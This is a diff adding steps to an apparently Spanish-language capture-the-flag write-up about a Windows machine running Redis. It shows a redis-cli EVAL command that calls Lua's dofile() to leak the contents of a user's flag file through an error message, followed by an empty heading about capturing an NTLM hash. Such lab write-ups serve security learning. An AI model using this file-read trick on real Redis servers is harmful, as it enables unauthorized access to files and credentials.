@@ -105,6 +105,19 @@ La informacion obtenida sobre los puertos es un poco escueta, pero aun asi hay u
 
   De la linea 104 deducimos que --> enterprise-security <-- es un usuario local del sistema, por lo que ya tenemos un usuario del sistema.
 
+    Info: Redis mediante el comando EVAL nos permite ejecutar scripts en Lua los cuales deben ser pasados como cadena(String).
+
+
+  4)Sabiendo esto podriamos leer la flag de usuario.(La ip cambia hemos tenido que reiniciar la maquina.)
+
+    10.10.240.193:6379> Eval "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')" 0
+    (error) ERR Error running script (call to f_ce5d85ea1418770097e56c1b605053114cc3ff2e): @user_script:1: C:\Users\enterprise-security\Desktop\user.txt:1: malformed number near 
+    '3eb176aee96---------0bc93580b291e'
+
+  5)Capturamos el Hash NTLM del usuario
+    
+  
+
 
 
     
